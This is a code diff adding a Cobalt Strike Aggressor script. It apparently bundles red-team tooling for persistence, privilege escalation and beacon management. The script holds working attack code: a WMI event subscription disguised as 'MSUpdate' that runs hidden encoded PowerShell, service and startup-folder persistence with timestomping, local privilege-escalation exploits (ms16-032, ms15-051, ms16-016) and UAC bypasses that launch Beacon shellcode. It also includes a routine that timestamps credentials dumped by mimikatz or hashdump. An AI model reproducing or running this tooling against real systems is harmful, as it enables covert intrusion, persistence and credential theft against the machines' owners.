+		bshell($1, 'sc config adsvc binpath= "C:\windows\system32\adsvc.exe" start= auto');
+		bshell($1, 'sc start adsvc');
+	}
+	else {
+		berror($1, "\c4Payload does not exist!!");
+	}
+
+}
+
+sub persistwmieventwmic {
+
+	if ($2 is $null) {
+		berror($1, "\c4You must provide an encoded payload.");
+		return;
+	}
+	
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="MSUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"');
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="PushMSUpdate", CommandLineTemplate="powershell.exe -nop -w hidden -encodedcommand '.$2."\"");
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"MSUpdate\"", Consumer="CommandLineEventConsumer.Name=\"PushMSUpdate\""');
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+	bshell($1, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+
+}
+
+sub persistwmievent {
+
+	if (-exists script_resource("scripts/wmi_event_persistence.ps1")) {
+		bpowershell_import($1, script_resource("scripts/wmi_event_persistence.ps1"));
+		bpowerpick($1, "WMIEventPersist");
+		blog($1, "Executing Permanent WMI Persistence as MSUpdate");
+		blog($1, "Use the Queries below to verify Execution:");
+		blog($1, 'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\'MSUpdate\'"');
+		blog($1, 'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\'MSUpdate\'"');
+		blog($1, 'Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match \'MSUpdate\'}');
+	}
+	else {
+		berror($1, "\c4wmi_event_persistence.ps1 does not exist!!");
+	}
+}
+
+sub persistThroughStartUpFolder {
+
+	if (-exists script_resource("Payloads/time_updater.exe")) {
+		bcd($1, 'c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup');
+		bupload($1, '/opt/cobaltstrike/Payloads/time_updater.exe');
+		btimestomp($1, "time_updater.exe", 'c:\windows\system32\calc.exe');	
+	}
+	else {
+		berror($1, "\c4Payload does not exist!!");
+	}
+}
+###########################################################
+##Elevate Kit
+##Thanks to @raffi for Aggressor source code
+#
+# Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
+# 
+# Integrate ms16-032
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+############################################################
+sub ms16_032_exploit {
+	local('$script $oneliner');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via ms16-032");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-MS16032.ps1"));
+	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
+
+	# give it another 10s to work.
+	bpause($1, 10000);
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_exploit); 
+
+# Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+
+sub eventvwr_exploit {
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-EventVwrBypass.ps1"));
+	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $oneliner $+ \"");
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("uac-eventvwr", "Bypass UAC with eventvwr.exe", &eventvwr_exploit);
+
+# Integrate wscript.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
+
+sub wscript_exploit {
+	# acknowledge this command
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	bpowershell_import!($1, script_resource("modules/Invoke-WScriptBypassUAC.ps1"));
+	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
+
+	# handle staging
+	bstage($1, $null, $2);
+}
+
+beacon_exploit_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_exploit);
+
+# Integrate windows/local/ms15_051_client_copy_image from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
+
+sub ms15_051_exploit {
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051");
+
+	# tune our parameters based on the target arch
+	if (-is64 $1) {
+		$arch   = "x64";
+		$dll    = "modules/cve-2015-1701.x64.dll";
+	}
+	else {
+		$arch   = "x86";
+		$dll    = "modules/cve-2015-1701.x86.dll";
+	}
+
+	# generate our shellcode
+	$stager = shellcode($2, false, $arch);
+
+	# make sure we have shellcode for this listener (some stagers are x86 only)
+	if ($stager is $null) {
+		berror($1, "\c4No $arch stager for listener ' $+ $2 $+ '");
+		return;
+	}
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, script_resource($dll), $stager, "ms15-051", 5000);
+
+	# stage our payload (if this is a bind payload)
+	bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
+
+# Integrate windows/local/ms16_016_webdav from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
+
+sub ms16_016_exploit {
+	# check if we're on an x64 system and error out.
+	if (-is64 $1) {
+		berror($1, "\c4ms16-016 exploit is x86 only");
+		return;
+	}
+
+	# acknowledge this command
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
+
+	# generate our shellcode
+	$stager = shellcode($2, false, "x86");
+
+	# spawn a Beacon post-ex job with the exploit DLL
+	bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+
+	# stage our payload (if this is a bind payload)
+	bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
+
+#################################################
+#
+# Sleep Timer Sub functions/alias
+#
+#################################################
+
+# constructs the config popup and saves settings
+sub SleepingHoursConfigPopup {
+
+	local('$saveButton $cancelButton');
+
+	# main title and dimensions of the dialog box in Width, Height
+	$dialog = dialog("Sleeping Hours Settings", 550, 400);
+
+	#creating the panel 
+	$containerPane = [new JPanel];
+		[$containerPane setLayout: [new GridLayout: 8, 1, 0, 0]];
+			
+		#creates the panel with the instruction textArea
+		$Instructionspanel = [new JPanel];
+		[$Instructionspanel setLayout: [new GridLayout: 0, 1, 0, 0]];
+			
+			$scrollPane = [new JScrollPane];
+			[$Instructionspanel add: $scrollPane];
+			
+			$txtrConfigureSleepDuration = [new JTextArea];
+			[$txtrConfigureSleepDuration setText: "Configure sleep duration to apply to all Beacons during the specified time range.\nOutside of the time range, a sleep setting of 60s is configured."];
+			[$txtrConfigureSleepDuration setEditable: false];
+			[$scrollPane setViewportView: $txtrConfigureSleepDuration];
+		#adds the newly-created Instructionspanel object to the containerPane object
+		[$containerPane add: $Instructionspanel];			
+
+		#creates the panel for the 'Sleep for' row
+		$SleepForpanel = [new JPanel];
+		[$SleepForpanel setLayout: [new FlowLayout: [FlowLayout CENTER], 5, 5]];
+		
+			$label = [new JLabel: "Sleep for"];
+			[$SleepForpanel add: $label];
+			
+			$SLEEPVALUE = [new JTextField];
+			[$SleepForpanel add: $SLEEPVALUE];
+			[$SLEEPVALUE setColumns: 10];
+			
+			$lblNewLabel = [new JLabel: "seconds [jitter %]"];
+			[$SleepForpanel add: $lblNewLabel];
+		[$containerPane add: $SleepForpanel];
+			
+		#creates the panel for the sleep starting time row
+		$Frompanel = [new JPanel];
+		[$Frompanel setLayout: [new FlowLayout: [FlowLayout CENTER], 5, 5]];
+			
+			$lblFrom = [new JLabel: "From"];
+			[$Frompanel add: $lblFrom];
+			
+			$spinner = [new JSpinner];
+			[$spinner setModel: [new SpinnerNumberModel: 0, 0, 23, 1]];
+			[$Frompanel add: $spinner];
+			
+			$lblH = [new JLabel: "h"];
+			[$Frompanel add: $lblH];
+			
+			$spinner_1 = [new JSpinner];
+			[$spinner_1 setModel: [new SpinnerNumberModel: 0, 0, 59, 1]];
+			[$Frompanel add: $spinner_1];
+			
+			$lblM = [new JLabel: "m"];
+			[$Frompanel add: $lblM];
+			
+			[$containerPane add: $Frompanel];
+
+		#creates the panel for the sleep ending time row	
+		$Topanel = [new JPanel];
+		$fl_Topanel = [new FlowLayout: [FlowLayout CENTER], 5, 5];
+		[$Topanel setLayout: $fl_Topanel];
+			
+			$lblNewLabel_1 = [new JLabel: "To"];
+			[$Topanel add: $lblNewLabel_1];
+			
+			$spinner_2 = [new JSpinner];
+			[$spinner_2 setModel: [new SpinnerNumberModel: 0, 0, 23, 1]];
+			[$Topanel add: $spinner_2];
+			
+			$lblH_1 = [new JLabel: "h"];
+			[$Topanel add: $lblH_1];
+			
+			$spinner_3 = [new JSpinner];
+			[$spinner_3 setModel: [new SpinnerNumberModel: 0, 0, 59, 1]];
+			[$Topanel add: $spinner_3];
+			
+			$lblM_1 = [new JLabel: "m"];
+			[$Topanel add: $lblM_1];
+
+			[$containerPane add: $Topanel];
+		
+		#creates the panel for the timezone note row	
+		$timezonePanel = [new JPanel];
+			
+			#pulls the teamserver's local timezone and populates the label with the data
+			$lbltimesAreIn = [new JLabel: "(times are in " . formatDate("z") . ")"];
+			[$lbltimesAreIn setFont: [new Font: "Dialog", [Font ITALIC], 10]];
+			[$timezonePanel add: $lbltimesAreIn];
+
+		[$containerPane add: $timezonePanel];
+			
+		#creates the panel for the 'heartbeat' checkbox row	
+		$heartbeatPanel = [new JPanel];
+		[$heartbeatPanel setLayout: [new FlowLayout: [FlowLayout CENTER], 5, 5]];
+			
+			$heartbeatCheckBox = [new JCheckBox: "Reset sleep setting every 60s during specified period"];
+			[$heartbeatPanel add: $heartbeatCheckBox];
+
+			[$containerPane add: $heartbeatPanel];
+
+		#creates the panel for the 'Enabled' checkbox row
+		$enabledpanel = [new JPanel];
+		[$enabledpanel setLayout: [new FlowLayout: [FlowLayout CENTER], 5, 5]];
+			
+			$enabledCheckBox = [new JCheckBox: "Enable sleep timer"];
+			[$enabledpanel add: $enabledCheckBox];
+
+			[$containerPane add: $enabledpanel];
+	
+		#creates the panel for the row of buttons
+		$Buttonspanel = [new JPanel];
+		[$Buttonspanel setLayout: [new FlowLayout: [FlowLayout CENTER], 5, 5]];
+			
+			$btnSave = [new JButton: "Save"];
+			[$Buttonspanel add: $btnSave];
+			
+			$btnCancel = [new JButton: "Cancel"];
+			[$Buttonspanel add: $btnCancel];
+
+			[$containerPane add: $Buttonspanel];
+
+	#adds the containerPanel (which contains all of the above panels) to the dialog object
+	[$dialog add: $containerPane];   
+
+	#Lines 182 - 203 fill in the input fields with previously saved settings
+
+	# read sleepsettings to set dialog settings. add jitter to field if the value is non-zero
+	if (%sleepsettings["jitter"] eq "0") {
+		[$SLEEPVALUE setText: %sleepsettings["sleep"]];
+	}
+	else {
+		[$SLEEPVALUE setText: %sleepsettings["sleep"] . " " . %sleepsettings["jitter"]];
+	}
+	
+	if (%sleepsettings["heartbeat"] eq "True"){
+		[$heartbeatCheckBox setSelected: 1]
+	};
+	if (%sleepsettings["enabled"] eq "True"){
+		[$enabledCheckBox setSelected: 1]
+	};
+	
+	# spinners must be set to integers by instantiating a new object
+	[$spinner setValue: [new Integer: %sleepsettings["from_h"]]];
+
+	[$spinner_1 setValue: [new Integer: %sleepsettings["from_m"]]];
+	
+	[$spinner_2 setValue: [new Integer: %sleepsettings["to_h"]]];
+	
+	[$spinner_3 setValue: [new Integer: %sleepsettings["to_m"]]];
+
+	# make the dialog visible
+	[$dialog setVisible: 1];
+
+
+    # Cancel button actions
+    [$btnCancel addActionListener: lambda({
+        [$dialog setVisible: 0]; 
+        })];
+
+    # Save button actions (lines 218 - 270)
+    [$btnSave addActionListener: lambda({
+        
+        #save sleep value
+        $sleeptext = [$SLEEPVALUE getText];
+        @sleeparray = split(" ",$sleeptext);
+        #catch errors for any sleep values where the sleep value is less than 0 or contains a non-digit
+        if ((int(@sleeparray[0]) < 0) || (@sleeparray[0] hasmatch '[^0-9]')) {
+        	show_error("Please enter a valid 'Sleep for' setting.");
+        	break;
+        }
+        else if (size(@sleeparray) == 1){
+        	%sleepsettings["sleep"] = $sleeptext;
+        	%sleepsettings["jitter"] = "0";
+        }
+        else if (size(@sleeparray) == 2) {
+        	%sleepsettings["sleep"] = @sleeparray[0];
+        	#error catching for jitter values not within 0 and 99
+        	if ((int(@sleeparray[1]) >= 0) && (int(@sleeparray[1]) <= 99)) {
+        		%sleepsettings["jitter"] = @sleeparray[1];
+        	}
+        	else {
+        		show_error("Please enter a jitter value between 0 - 99.");
+        		break;
+        	}
+        }
+        else {
+        	show_error("Please enter a valid 'Sleep for' setting.");
+        	break;
+        }
+
+    	#save heartbeat checkbox
+    	if ([$heartbeatCheckBox isSelected] == 1) {
+			%sleepsettings["heartbeat"] = "True";
+		}
+		else {
+			%sleepsettings["heartbeat"] = "False";				
+		}
+
+    	#save enabled checkbox
+    	if ([$enabledCheckBox isSelected] == 1) {
+			%sleepsettings["enabled"] = "True";
+		}
+		else {
+			%sleepsettings["enabled"] = "False";				
+		}
+
+		#save from and to time values
+		%sleepsettings["from_h"] = [$spinner getValue];
+		%sleepsettings["from_m"] = [$spinner_1 getValue];
+		%sleepsettings["to_h"] = [$spinner_2 getValue];
+		%sleepsettings["to_m"] = [$spinner_3 getValue];
+
+		#log saved settings to event log
+		elog("Beacons will sleep for " . %sleepsettings["sleep"] . "s with " . %sleepsettings["jitter"] . "% jitter from " . %sleepsettings["from_h"] . "h " . %sleepsettings["from_m"] . "m to " . %sleepsettings["to_h"] . "h " . %sleepsettings["to_m"] . "m " . formatDate("z") . ".");
+
+        [$dialog setVisible: 0]; 
+        })];
+};
+
+#logic to test if sleeping hours are active
+sub testSleepingHours {
+	$currentHour = int(formatDate('HH'));
+	$currentMin = int(formatDate('mm'));
+	if (%sleepsettings["from_h"] > %sleepsettings["to_h"]) {
+		if (($currentHour > %sleepsettings["from_h"]) || ($currentHour < %sleepsettings["to_h"])){
+			return "True";
+		}
+		else if (($currentHour == %sleepsettings["from_h"]) && ($currentMin >= %sleepsettings["from_m"])){
+			return "True";
+		}
+		else if (($currentHour == %sleepsettings["to_h"]) && ($currentMin <= %sleepsettings["to_m"])){
+			return "True";
+		}
+		else {
+			return "False";
+		}
+	}
+	else if (%sleepsettings["from_h"] < %sleepsettings["to_h"]) {
+		if (($currentHour > %sleepsettings["from_h"]) && ($currentHour < %sleepsettings["to_h"])){
+			return "True";
+		}
+		else if (($currentHour == %sleepsettings["from_h"]) && ($currentMin >= %sleepsettings["from_m"])){
+			return "True";
+		}
+		else if (($currentHour == %sleepsettings["to_h"]) && ($currentMin <= %sleepsettings["to_m"])){
+			return "True";
+		}
+		else {
+			return "False";
+		}		
+	}
+	else if (%sleepsettings["from_h"] == %sleepsettings["to_h"]) {
+		if (($currentMin >= %sleepsettings["from_m"]) && ($currentMin <= %sleepsettings["to_m"])) {
+			return "True";
+		}
+		else {
+			return "False";
+		}
+	}
+	else {
+		return "False";
+	}
+};
+
+#function to change the sleep timer on all hosts
+# $1 = sleep value, $2 = jitter value
+sub sleepAll {
+	foreach $beacon (beacons()) {
+	$id = $beacon['id'];
+	binput($id, "sleep $1 $2");
+	bsleep($id, $1, $2);
+    }
+}
+
+#scalars used to avoid the start, end, and heartbeats running multiple times per minute and starting the sleep cycle sooner in the minute
+global('$processonce_value $heartbeat_skip');
+$processonce_value = "False";
+$heartbeat_skip = "False";
+
+on heartbeat_30s {
+	$currentHour = formatDate('HH');
+	$currentMin = formatDate('mm');
+
+
+	if (%sleepsettings["enabled"] eq "False") {
+		$processonce_value = "False";
+	}
+	#start of sleeping hours
+	else if (($currentHour == %sleepsettings["from_h"]) && ($currentMin == %sleepsettings["from_m"])) {
+		if ($processonce_value eq "False") {
+			elog("Starting sleeping hours");
+			sleepAll(%sleepsettings["sleep"],%sleepsettings["jitter"]);
+			$processonce_value = "True";
+		}
+	}
+	#end of sleeping hours
+	else if (($currentHour == %sleepsettings["to_h"]) && ($currentMin == %sleepsettings["to_m"])) {
+		if ($processonce_value eq "False") {
+			elog("Ending sleeping hours");
+			sleepAll(60,0);
+			$processonce_value = "True";
+		}
+	}
+	else if ((testSleepingHours() eq "True") && (%sleepsettings["heartbeat"] eq "True")) {
+		sleepAll(%sleepsettings["sleep"],%sleepsettings["jitter"]);
+		$heartbeat_skip = "True";
+	}
+	else {
+		$processonce_value = "False";
+		$heartbeat_skip = "False";
+	}	
+}
+
+#set up an alias for "sleeptimer"
+alias sleeptimer {
+	SleepingHoursConfigPopup();
+}
+
+#menubar options
+menubar("Sleeping Hours", "SleepingHours", 2);
+
+# modify the main "Attacks" menu
+popup SleepingHours {
+	item "Configure Settings" {
+		SleepingHoursConfigPopup();
+	}
+}
+
+###################################################
+#
+# GUI Helper Methods
+#   these are all from armitage/scripts/gui.sl
+#
+###################################################
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+	local('$dialog');
+		$dialog = [new JDialog: $__frame__, $1];
+		[$dialog setSize: $2, $3];
+		[$dialog setLayout: [new BorderLayout]];
+		[$dialog setLocationRelativeTo: $__frame__];
+	return $dialog;
+}
+###################################################
+# Credential TimeStamp Sub Function
+# author: bluescreenofjeff
+# Adds a timestamp to the source column in new credentials
+# Removed credentials will not repopulate a timestamp until the script has been reloaded
+# Note: Adds "no timestamp" to the source column of existing creds. Modifying the credential (except the Note) will trigger a new timestamp.
+###################################################
+global('@credential_dedupe');
+
+#function to add timestamp note to all credentials with blank notes
+sub timestampNote {
+	local('$user $password $realm $source $host $pwtimestamp $onload');
+	$onload = "False";
+	if ($1 eq "initial") {
+		$onload = "True";
+	}
+	foreach $key => $value (credentials()) {
+		$user = $value['user'];
+		$password = $value['password'];
+		$realm = $value['realm'];
+		$source = $value['source'];
+		$host = $value['host'];
+		$pwtimestamp = formatDate('MM/dd/yyyy HH:mm:ss (z)');
+		$cred_hash = "$user\t$password\t$realm\t$source\t$host";
+		if ($cred_hash !in @credential_dedupe) {
+			if (($source eq 'hashdump') || ($source eq 'mimikatz') || ($source eq 'wdigest')) {
+				if ($onload eq "True") {
+					add(@credential_dedupe,$cred_hash);
+				}
+				else {
+					add(@credential_dedupe,$cred_hash);
+					credential_add("$user","$password","$realm","$source - $pwtimestamp","$host");	
+				}
+			}
+		}
+	}
+}
+
+#on scriptload, marks all existing credentials with source of mimikatz or hashdump with "no timestamp"
+timestampNote("initial");
+
+#on credentials, labels new creds with timestamp
+on credentials {
+	timestampNote();
+}
